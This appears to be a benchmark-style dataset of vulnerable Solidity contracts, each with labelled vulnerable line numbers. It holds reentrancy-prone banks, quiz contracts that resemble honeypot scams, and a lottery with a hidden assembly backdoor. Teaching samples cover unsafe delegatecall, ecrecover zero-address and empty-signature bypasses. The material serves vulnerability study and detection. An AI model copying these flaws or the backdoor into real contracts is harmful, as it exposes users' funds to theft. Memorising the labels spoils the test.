    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 1 ether;    
    function trust_bank(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[18, 20, 22]"
"pragma solidity ^0.4.25;
contract try_it
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value > 1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    bytes32 questionerPin = 0x375f26a4de333a30af8cae9ae2a71796f5a346f2cd3852205ce5475634da44ad;
    function Activate(bytes32 _questionerPin, string _question, string _response) public payable {
        if(keccak256(_questionerPin)==questionerPin) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
            questionerPin = 0x0;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[26]
"pragma solidity ^0.4.25;
contract try_me
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value > 2 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    bytes32 questionerPin = 0x87caf8284fc9e2ceb49fcda22fb9ac5b7fcff577de00ed97de37e86255880646;
    function ActivateContract(bytes32 _questionerPin, string _question, string _response) public payable {
        if(keccak256(_questionerPin)==questionerPin) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
            questionerPin = 0x0;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[26]
"pragma solidity ^0.4.20;
contract try_to_Play
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>3 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function SetTTP(string _question,string _response) public payable {
        if(responseHash==0x0) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[24]
"pragma solidity ^0.4.25;
contract try_to_play {
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value > 2 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    bytes32 questionerPin = 0x3220587a12f2ddeabd33fb6830925eae0456db99c9af8ea248d79044ffafd632;
    function ActivateContract(bytes32 _questionerPin, string _question, string _response) public payable {
        if(keccak256(_questionerPin)==questionerPin) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
            questionerPin = 0x0;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[25]
"pragma solidity ^0.4.25;
contract ultra_bank
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 1 ether;    
    function ultra_bank(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[18, 20, 22]"
"pragma solidity ^0.4.25;
contract we_play
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value > 3 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    bytes32 questionerPin = 0x1e378945a7ffddbff537b1971e2c7d9be10d4529a0bc51e99b3ab825d27124c8;
    function ActivateContract(bytes32 _questionerPin, string _question, string _response) public payable {
        if(keccak256(_questionerPin)==questionerPin) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
            questionerPin = 0x0;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[26]
"pragma solidity ^0.4.18;
contract HTLC {
////////////////
//Global VARS//////////////////////////////////////////////////////////////////////////
//////////////
    string public version;
    bytes32 public digest;
    address public dest;
    uint public timeOut;
    address issuer; 
/////////////
//MODIFIERS////////////////////////////////////////////////////////////////////
////////////
    modifier onlyIssuer {assert(msg.sender == issuer); _; }
//////////////
//Operations////////////////////////////////////////////////////////////////////////
//////////////
/*constructor */
    //require all fields to create the contract
    function HTLC(bytes32 _hash, address _dest, uint _timeLimit) public {
        assert(digest != 0 || _dest != 0 || _timeLimit != 0);
        digest = _hash;
        dest = _dest;
        timeOut = now + (_timeLimit * 1 hours);
        issuer = msg.sender; 
    }
 /* public */   
    //a string is subitted that is hash tested to the digest; If true the funds are sent to the dest address and destroys the contract    
    function claim(string _hash) public returns(bool result) {
       require(digest == sha256(_hash));
       selfdestruct(dest);
       return true;
       }
       //allow payments
    function () public payable {}
/* only issuer */
    //if the time expires; the issuer can reclaim funds and destroy the contract
    function refund() onlyIssuer public returns(bool result) {
        require(now >= timeOut);
        selfdestruct(issuer);
        return true;
    }
}
contract xcat {
    string public version = ""v1"";
    struct txLog{
        address issuer;
        address dest;
        string chain1;
        string chain2;
        uint amount1;
        uint amount2;
        uint timeout;
        address crtAddr;
        bytes32 hashedSecret; 
    }
    event newTrade(string onChain, string toChain, uint amount1, uint amount2);
    mapping(bytes32 => txLog) public ledger;
    function testHash(string yourSecretPhrase) public returns (bytes32 SecretHash) {return(sha256(yourSecretPhrase));}
    function newXcat(bytes32 _SecretHash, address _ReleaseFundsTo, string _chain1, uint _amount1, string _chain2, uint _amount2, uint _MaxTimeLimit) public returns (address newContract) {
        txLog storage tl = ledger[sha256(msg.sender,_ReleaseFundsTo,_SecretHash)];
    //make the contract
        HTLC h = new HTLC(_SecretHash, _ReleaseFundsTo, _MaxTimeLimit);
    //store info
        tl.issuer = msg.sender;
        tl.dest = _ReleaseFundsTo;
        tl.chain1 = _chain1;
        tl.chain2 = _chain2;
        tl.amount1 = _amount1;
        tl.amount2 = _amount2;
        tl.timeout = _MaxTimeLimit;
        tl.hashedSecret = _SecretHash; 
        tl.crtAddr = h;
        newTrade (tl.chain1, tl.chain2, tl.amount1, tl.amount2);
        return h;
    }
    //avoid taking funds
    function() public { assert(0>1);} 
    // allow actors to view their tx
    function viewXCAT(address _issuer, address _ReleaseFundsTo, bytes32 _SecretHash) public returns (address issuer, address receiver, uint amount1, string onChain, uint amount2, string toChain, uint atTime, address ContractAddress){
        txLog storage tl = ledger[sha256(_issuer,_ReleaseFundsTo,_SecretHash)];
        return (tl.issuer, tl.dest, tl.amount1, tl.chain1, tl.amount2, tl.chain2,tl.timeout, tl.crtAddr);
    }
}
/////////////////////////////////////////////////////////////////////////////
  // 88888b   d888b  88b  88 8 888888         _.-----._
  // 88   88 88   88 888b 88 P   88   \)|)_ ,'         `. _))|)
  // 88   88 88   88 88`8b88     88    );-'/             \`-:(
  // 88   88 88   88 88 `888     88   //  :               :  \\   .
  // 88888P   T888P  88  `88     88  //_,'; ,.         ,. |___\\
  //    .           __,...,--.       `---':(  `-.___.-'  );----'
  //              ,' :    |   \            \`. `'-'-'' ,'/
  //             :   |    ;   ::            `.`-.,-.-.','
  //     |    ,-.|   :  _//`. ;|              ``---\` :
  //   -(o)- (   \ .- \  `._// |    *               `.'       *
  //     |   |\   :   : _ |.-  :              .        .
  //     .   :\: -:  _|\_||  .-(    _..----..
  //         :_:  _\\_`.--'  _  \,-'      __ \
  //         .` \\_,)--'/ .'    (      ..'--`'          ,-.
  //         |.- `-'.-               ,'                (///)
  //         :  ,'     .            ;             *     `-'
  //   *     :         :           /
  //          \      ,'         _,'   88888b   888    88b  88 88  d888b  88
  //           `._       `-  ,-'      88   88 88 88   888b 88 88 88   `  88
  //            : `--..     :        *88888P 88   88  88`8b88 88 88      88
  //        .   |           |	        88    d8888888b 88 `888 88 88   ,  `""
  //            |           | 	      88    88     8b 88  `88 88  T888P  88
  /////////////////////////////////////////////////////////////////////////","[24, 29, 30, 31, 39]"
"pragma solidity 0.4.24;
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a); 
    return c;
  }
}
contract xyphar {
    event Multisended(uint256 value , address sender);
    using SafeMath for uint256;
    function multisendEther(address[] _contributors, uint256[] _balances) public payable {
        uint256 total = msg.value;
        uint256 i = 0;
        for (i; i < _contributors.length; i++) {
            require(total >= _balances[i] );
            total = total.sub(_balances[i]);
            _contributors[i].transfer(_balances[i]);
        }
        emit Multisended(msg.value, msg.sender);
    }
}",[36]
"pragma solidity ^0.4.20;
contract you_can_do_it
{
    function Try(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function start_quiz(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
/*
Name: Over-Permissive Approve Scam
Description:
This vulnerability is associated with the approval process in ERC20 tokens. 
In this scenario, Alice approves Eve to transfer an unlimited (type(uint256).max) amount of tokens 
from Alice's account. Later, Eve exploits this permission and transfers 1000 tokens from Alice's account to hers.
Most current scams use approve or setApprovalForAll to defraud your transfer rights. Be especially careful with this part.
Mitigation:
Users should only approve the amount of tokens necessary for the operation at hand. 
*/
/*
 * @vulnerable_at_lines: 72
 */
interface IERC20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address account) external view returns (uint);
    function transfer(address recipient, uint amount) external returns (bool);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint);
    function approve(address spender, uint amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}
contract ERC20 is IERC20 {
    uint public totalSupply;
    mapping(address => uint) public balanceOf;
    mapping(address => mapping(address => uint)) public allowance;
    string public name = ""Test example"";
    string public symbol = ""Test"";
    uint8 public decimals = 18;
    function transfer(address recipient, uint amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }
    function approve(address spender, uint amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) external returns (bool) {
        allowance[sender][msg.sender] -= amount;
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }
    function mint(uint amount) external {
        balanceOf[msg.sender] += amount;
        totalSupply += amount;
        emit Transfer(address(0), msg.sender, amount);
    }
    function burn(uint amount) external {
        balanceOf[msg.sender] -= amount;
        totalSupply -= amount;
        emit Transfer(msg.sender, address(0), amount);
    }
}",[56]
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
/*
Name: Array Deletion Oversight: leading to data inconsistency
Description:
In Solidity where improper deletion of elements from dynamic arrays can result in data inconsistency. 
When attempting to delete elements from an array, if the deletion process is not handled correctly, 
the array may still retain storage space and exhibit unexpected behavior. 
Mitigation:  
Option1: By copying the last element and placing it in the position to be removed.
Option2: By shifting them from right to left.
REF:
https://twitter.com/1nf0s3cpt/status/1677167550277509120
https://blog.solidityscan.com/improper-array-deletion-82672eed8e8d
https://github.com/sherlock-audit/2023-03-teller-judging/issues/88
*/
/*
 * @vulnerable_at_lines: 32
 */
contract ArrayDeletionBug {
    uint[] public myArray = [1, 2, 3, 4, 5];
    function deleteElement(uint index) external {
        require(index < myArray.length, ""Invalid index"");
        delete myArray[index];
    }
    function getLength() public view returns (uint) {
        return myArray.length;
    }
}
contract FixedArrayDeletion {
    uint[] public myArray = [1, 2, 3, 4, 5];
    //Mitigation 1: By copying the last element and placing it in the position to be removed.
    function deleteElement(uint index) external {
        require(index < myArray.length, ""Invalid index"");
        // Swap the element to be deleted with the last element
        myArray[index] = myArray[myArray.length - 1];
        // Delete the last element
        myArray.pop();
    }
    // Mitigation 2: By shifting them from right to left.
    function deleteElement2(uint index) external {
        require(index < myArray.length, ""Invalid index"");
        for (uint i = index; i < myArray.length - 1; i++) {
            myArray[i] = myArray[i + 1];
        }
        // Delete the last element
        myArray.pop();
    }
    function getLength() public view returns (uint) {
        return myArray.length;
    }
}",[24]
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
/* 
Name: Hidden Backdoor in Contract:
Description:
In this contract, an apparently fair 'LotteryGame' contract is subtly designed to allow 
a hidden privilege to the contract deployer/administrator. 
This is achieved through the use of assembly level access to storage variables, 
where a referee function is designed to provide an administrative backdoor. 
The 'pickWinner' function appears to randomly pick a winner, but in reality,
it allows the administrator to set the winner. 
This bypasses the usual access controls and can be used to drain the prize pool 
by an unauthorized user, acting as a type of rug pull.
An attacker can manipulate smart contracts as a backdoor by writing inline assembly. 
Any sensitive parameters can be changed at any time.
Scenario:
Lottery game: anyone can call pickWinner to get prize if you are lucky. 
Refers to JST contract backdoor. many rugged style's contract has similar pattern.
Looks like theres is no setwinner function in contract, how admin can rug?
*/
/*
 * @vulnerable_at_lines: 44, 46, 47, 51, 53, 54
 */
contract LotteryGame {
    uint256 public prize = 1000;
    address public winner;
    address public admin = msg.sender;
    modifier safeCheck() {
        if (msg.sender == referee()) {
            _;
        } else {
            getkWinner();
        }
    }
    function referee() internal view returns (address user) {
        assembly {
            // load admin value at slot 2 of storage
            user := sload(2)
        }
    }
    function pickWinner(address random) public safeCheck {
        assembly {
            // admin backddoor which can set winner address
            sstore(1, random)
        }
    }
    function getkWinner() public view returns (address) {
        return winner;
    }
}","[36, 38, 39, 42, 44, 45]"
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
/*
Name: Bypass isContract() validation
Description:
The attacker only needs to write the code in the constructor of the smart contract 
to bypass the detection mechanism of whether it is a smart contract.
REF:
https://www.infuy.com/blog/bypass-contract-size-limitations-in-solidity-risks-and-prevention/
*/
/*
 * @vulnerable_at_lines: 25, 26, 27, 34
 */
contract Target {
    function isContract(address account) public view returns (bool) {
        // This method relies on extcodesize, which returns 0 for contracts in
        // construction, since the code is only stored at the end of the
        // constructor execution.
        uint size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }
    bool public pwned = false;
    function protected() external {
        require(!isContract(msg.sender), ""no contract allowed"");
        pwned = true;
    }
}
contract TargetRemediated {
    function isContract(address account) public view returns (bool) {
        require(tx.origin == msg.sender);
        return account.code.length > 0;
    }
    bool public pwned = false;
    function protected() external {
        require(!isContract(msg.sender), ""no contract allowed"");
        pwned = true;
    }
}","[20, 21, 22, 27]"
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
/*
Name: Data Location Confusion Vulnerability
Description:
Misuse of storage and memory references of the user in the updaterewardDebt function.
The function updaterewardDebt is updating the rewardDebt value of a UserInfo struct 
that is stored in memory. The issue is that this won't persist between function calls. 
As soon as the function finishes executing, the memory is cleared and the changes are lost.
Mitigation:
Ensure the correct usage of memory and storage in the function parameters. Make all the locations explicit.
REF:
https://mudit.blog/cover-protocol-hack-analysis-tokens-minted-exploit/
https://www.educative.io/answers/storage-vs-memory-in-solidity
*/
/*
 * @vulnerable_at_lines: 36, 37
 */
contract Array {
    mapping(address => UserInfo) public userInfo; // storage
    struct UserInfo {
        uint256 amount; // How many tokens got staked by user.
        uint256 rewardDebt; // Reward debt. See Explanation below.
    }
    function updaterewardDebt(uint amount) public {
        UserInfo memory user = userInfo[msg.sender]; // memory, vulnerable point
        user.rewardDebt = amount;
    }
    function fixedupdaterewardDebt(uint amount) public {
        UserInfo storage user = userInfo[msg.sender]; // storage
        user.rewardDebt = amount;
    }
}","[26, 27]"
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
/*
Name: Unsafe Delegatecall Vulnerability
Description:
The Proxy Contract Owner Manipulation Vulnerability is a flaw in the smart contract design that
allows an attacker to manipulate the owner of the Proxy contract, which is hardcoded as 0xdeadbeef.
The vulnerability arises due to the use of delegatecall in the fallback function of the Proxy contract. 
delegatecall allows an attacker to invoke the pwn() function from the Delegate contract within the context 
of the Proxy contract, thereby changing the value of the owner state variable of the Proxy contract.
This allows a smart contract to dynamically load code from a different address at runtime.
Scenario:
Proxy Contract is designed for helping users call logic contract
Proxy Contract's owner is hardcoded as 0xdeadbeef
Can you manipulate Proxy Contract's owner ?
Mitigation:
To mitigate the Proxy Contract Owner Manipulation Vulnerability, 
avoid using delegatecall unless it is explicitly required, and ensure that the delegatecall is used securely. 
If the delegatecall is necessary for the contract's functionality, make sure to validate and 
sanitize inputs to avoid unexpected behaviors.
*/
/*
 * @vulnerable_at_lines: 40
 */
contract Proxy {
    address public owner = address(0xdeadbeef); // slot0
    Delegate delegate;
    constructor(address _delegateAddress) public {
        delegate = Delegate(_delegateAddress);
    }
    fallback() external {
        (bool suc, ) = address(delegate).delegatecall(msg.data); // vulnerable
        require(suc, ""Delegatecall failed"");
    }
}
contract Delegate {
    address public owner; // slot0
    function pwn() public {
        owner = msg.sender;
    }
}",[32]
"// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;
// the issue is fixed in 0.8.15
/*
Name: Dirtybytes in > Solidity 0.8.15
    ""description"": ""Copying ``bytes`` arrays from memory or calldata to storage is done in chunks of 32 bytes even if the length is not a multiple of 32. 
    Thereby, extra bytes past the end of the array may be copied from calldata or memory to storage. 
    These dirty bytes may then become observable after a ``.push()`` without arguments to the bytes array in storage,
    i.e. such a push will not result in a zero value at the end of the array as expected. 
    This bug only affects the legacy code generation pipeline, the new code generation pipeline via IR is not affected.""
    ""link"": https://blog.soliditylang.org/2022/06/15/dirty-bytes-array-to-storage-bug/
    ""fixed"": 0.8.15
*/
/*
 * @vulnerable_at_lines: 35
 */
contract Dirtybytes {
    event ev(uint[], uint);
    bytes s;
    constructor() {
        // The following event emission involves writing to temporary memory at the current location
        // of the free memory pointer. Several other operations (e.g. certain keccak256 calls) will
        // use temporary memory in a similar manner.
        // In this particular case, the length of the passed array will be written to temporary memory
        // exactly such that the byte after the 63 bytes allocated below will be 0x02. This dirty byte
        // will then be written to storage during the assignment and become visible with the push in ``h``.
        emit ev(new uint[](2), 0);
        bytes memory m = new bytes(63);
        s = m;
    }
    function h() external returns (bytes memory) {
        s.push();
        return s;
    }
}",[29]
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
/*
Name: Precision Issues - Divide before multiply
Description:
The contracts demonstrate a common issue when performing division operations in Solidity, 
as Solidity doesn't support floating-point numbers. The order of operations can affect the result due to integer truncation.
In the Miscalculation contract, the function price performs the division before the
multiplication (price / 100) * discount. Due to the fact that Solidity truncates integers
when dividing, the result of price / 100 will be 0 if the price is less than 100. 
This causes the result of the multiplication to be 0 as well.
On the other hand, in the Calculation contract, the function price performs the multiplication
before the division (price * discount) / 100. This way, the result will be correct as the multiplication
doesn't get truncated, only the final result does.
Mitigation:Always perform multiplication before division to avoid losing precision.
REF:
https://twitter.com/1nf0s3cpt/status/1599774264437395461
https://blog.solidityscan.com/precision-loss-in-arithmetic-operations-8729aea20be9
*/
/*
 * @vulnerable_at_lines: 37
 */
contract Miscalculation {
    function price(
        uint256 price,
        uint256 discount
    ) public pure returns (uint256) {
        return (price / 100) * discount; // wrong calculation
    }
}
contract Calculation {
    function price(
        uint256 price,
        uint256 discount
    ) public pure returns (uint256) {
        return (price * discount) / 100; // correct calculation
    }
}",[28]
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
/*
Name: Denial of Service
Description:
The KingOfEther contract holds a game where a user can claim the throne by sending more Ether than the current balance. 
The contract attempts to return the previous balance to the last ""king"" when a new user sends more Ether. However,
this mechanism can be exploited. An attacker's contract (here, the Attack contract) can become the king 
and then make the fallback function revert or consume more than the stipulated gas limit, 
causing the claimThrone function to fail whenever the KingOfEther contract tries to return Ether to the last king. 
Mitigation:
Use a Pull payment pattern, A way to prevent this is to enable users to withdraw their Ether, instead of sending it to them.
REF:
https://slowmist.medium.com/intro-to-smart-contract-security-audit-dos-e23e9e901e26
*/
/*
 * @vulnerable_at_lines: 32, 33
 */
contract KingOfEther {
    address public king;
    uint public balance;
    function claimThrone() external payable {
        require(msg.value > balance, ""Need to pay more to become the king"");
        (bool sent, ) = king.call{value: balance}("""");
        require(sent, ""Failed to send Ether"");
        balance = msg.value;
        king = msg.sender;
    }
}","[24, 25]"
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
/*
Name: ecrecover returns address(0)
Description:
In the SimpleBank contract, the transfer function takes a message hash and a signature (v, r, s values) as inputs.
It recovers the signer address and checks if it equals Admin. The vulnerability lies in the fact 
that the ecrecover function may return a 0x0 address when the signature parameters 
are invali, If v value isn't 27 or 28. it will return address(0).
Mitigation:  
Verify that the result from ecrecover isn't 0 or instead use OpenZeppelin’s ECDSA library.
REF:
https://twitter.com/1nf0s3cpt/status/1674268926761668608
https://github.com/code-423n4/2021-09-swivel-findings/issues/61
https://github.com/Kaiziron/numen_ctf_2023_writeup/blob/main/wallet.md
*/
/*
 * @vulnerable_at_lines: 40, 57
 */
contract SimpleBank {
    mapping(address => uint256) private balances;
    address Admin; //default is address(0)
    function getBalance(address _account) public view returns (uint256) {
        return balances[_account];
    }
    function recoverSignerAddress(
        bytes32 _hash,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) private pure returns (address) {
        address recoveredAddress = ecrecover(_hash, _v, _r, _s);
        return recoveredAddress;
    }
    function transfer(
        address _to,
        uint256 _amount,
        bytes32 _hash,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) public {
        require(_to != address(0), ""Invalid recipient address"");
        address signer = recoverSignerAddress(_hash, _v, _r, _s);
        //require(signer != address(0), ""Invalid signature"");
        require(signer == Admin, ""Invalid signature"");
        balances[_to] += _amount;
    }
    function transferMitigated(
        address _to,
        uint256 _amount,
        bytes32 _hash,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) public {
        require(_to != address(0), ""Invalid recipient address"");
        address signer = recoverSignerAddress(_hash, _v, _r, _s);
        require(signer != address(0), ""Invalid signature"");
        //require(signer == Admin, ""Invalid signature"");
        balances[_to] += _amount;
    }
}","[32, 46]"
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;
import ""@openzeppelin/contracts/token/ERC20/IERC20.sol"";
/*
Name: Empty loop issue
Description:
Due to insufficient validation, an attacker can simply pass an empty array to bypass the loop and signature verification.
Mitigation:  
Check the number of signatures  
require(sigs.length > 0, ""No signatures provided"");
REF:
https://twitter.com/1nf0s3cpt/status/1673195574215213057
https://twitter.com/akshaysrivastv/status/1648310441058115592
https://dacian.me/exploiting-developer-assumptions#heading-unexpected-empty-inputs
*/
/*
 * @vulnerable_at_lines: 41
 */
contract SimpleBank {
    struct Signature {
        bytes32 hash;
        uint8 v;
        bytes32 r;
        bytes32 s;
    }
    function verifySignatures(Signature calldata sig) public {
        require(
            msg.sender == ecrecover(sig.hash, sig.v, sig.r, sig.s),
            ""Invalid signature""
        );
    }
    function withdraw(Signature[] calldata sigs) public {
        // Mitigation: Check the number of signatures
        //require(sigs.length > 0, ""No signatures provided"");
        for (uint i = 0; i < sigs.length; i++) {
            Signature calldata signature = sigs[i];
            // Verify every signature and revert if any of them fails to verify.
            verifySignatures(signature);
        }
        payable(msg.sender).transfer(1 ether);
    }
    function withdrawMitigated(Signature[] calldata sigs) public {
        // Mitigation: Check the number of signatures
        require(sigs.length > 0, ""No signatures provided"");
        for (uint i = 0; i < sigs.length; i++) {
            Signature calldata signature = sigs[i];
            // Verify every signature and revert if any of them fails to verify.
            verifySignatures(signature);
        }
        payable(msg.sender).transfer(1 ether);
    }
    receive() external payable {}
}",[32]
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
import ""@openzeppelin/contracts/token/ERC777/ERC777.sol"";
/*
Name: ERC777 Reentrancy Vulnerability
Description:
ERC777 tokens allow arbitrary callbacks via hooks that are called during token transfers.
Malicious contract addresses may cause reentrancy on such callbacks if reentrancy guards are not used. 
Scenario:
Maximum claims is 1,000 for each EOA, How can you bypass this limitation?
Mitigation:
Follow check-effect-interaction and use OpenZeppelin Reentrancy Guard.
REF
https://medium.com/cream-finance/c-r-e-a-m-finance-post-mortem-amp-exploit-6ceb20a630c5
*/
/*
 * @vulnerable_at_lines: 80, 81
 */
contract MyERC777 is ERC777 {
    constructor(
        uint256 initialSupply
    ) ERC777(""Gold"", ""GLD"", new address[](0)) {}
    function mint(
        address account,
        uint256 amount,
        bytes memory userData,
        bytes memory operatorData
    ) public returns (bool) {
        _mint(account, amount, userData, operatorData);
        return true;
    }
}
contract SimpleBank is Test {
    ERC777 private token;
    uint maxMintsPerAddress = 1000;
    mapping(address => uint256) public _mints;
    bytes32 private constant _TOKENS_RECIPIENT_INTERFACE_HASH =
        keccak256(""ERC777TokensRecipient"");
    function setUp() external {
        // mock ERC1820Registry contract in foundry
        vm.etch(
            address(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24),
            bytes(
                hex""608060405234801561001057600080fd5b50600436106100a5576000357c010000000000000000000000000000000000000000000000000000000090048063a41e7d5111610078578063a41e7d51146101d4578063aabbb8ca1461020a578063b705676514610236578063f712f3e814610280576100a5565b806329965a1d146100aa5780633d584063146100e25780635df8122f1461012457806365ba36c114610152575b600080fd5b6100e0600480360360608110156100c057600080fd5b50600160a060020a038135811691602081013591604090910135166102b6565b005b610108600480360360208110156100f857600080fd5b5035600160a060020a0316610570565b60408051600160a060020a039092168252519081900360200190f35b6100e06004803603604081101561013a57600080fd5b50600160a060020a03813581169160200135166105bc565b6101c26004803603602081101561016857600080fd5b81019060208101813564010000000081111561018357600080fd5b82018360208201111561019557600080fd5b803590602001918460018302840111640100000000831117156101b757600080fd5b5090925090506106b3565b60408051918252519081900360200190f35b6100e0600480360360408110156101ea57600080fd5b508035600160a060020a03169060200135600160e060020a0319166106ee565b6101086004803603604081101561022057600080fd5b50600160a060020a038135169060200135610778565b61026c6004803603604081101561024c57600080fd5b508035600160a060020a03169060200135600160e060020a0319166107ef565b604080519115158252519081900360200190f35b61026c6004803603604081101561029657600080fd5b508035600160a060020a03169060200135600160e060020a0319166108aa565b6000600160a060020a038416156102cd57836102cf565b335b9050336102db82610570565b600160a060020a031614610339576040805160e560020a62461bcd02815260206004820152600f60248201527f4e6f7420746865206d616e616765720000000000000000000000000000000000604482015290519081900360640190fd5b6103428361092a565b15610397576040805160e560020a62461bcd0281526020